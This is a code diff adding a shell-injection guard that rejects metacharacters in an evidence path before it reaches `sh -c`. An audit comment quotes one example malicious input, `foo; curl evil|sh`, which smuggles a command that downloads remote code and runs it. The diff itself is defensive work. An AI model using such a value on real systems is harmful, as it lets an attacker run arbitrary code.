@@ -19,6 +19,7 @@ import type {
 } from "./accept.js";
 import { resolvePlaceholder } from "./accept-credentials.js";
 import { isUrlAllowed, redactSnapshot } from "./accept-security.js";
+import { isComplexCommand } from "./destructive-guard.js";
 import {
   AgentBrowserCliClient,
   type AgentBrowserClient,
@@ -469,6 +470,16 @@ export function resolveTestCommand(
   cfg: DelegateConfig,
   evidencePath?: string,
 ): string {
+  // Audit P3-latent-B (2026-07-16): evidencePath is spliced onto the test
+  // command and later run via `sh -c`. It is extracted from a scenario's
+  // Evidence: line, so it must be a path — never shell operators. Reject
+  // metacharacters up front so an Evidence line like `foo; curl evil|sh` can't
+  // reach the shell. Currently dead code, but guard now (SR-2).
+  if (evidencePath !== undefined && isComplexCommand(evidencePath)) {
+    throw new Error(
+      `refused: evidencePath contains shell metacharacters/operators (injection guard): "${evidencePath}"`,
+    );
+  }
   const explicit = cfg.testCommands?.[layer];
   if (explicit) {
     return evidencePath ? `${explicit} ${evidencePath}` : explicit;
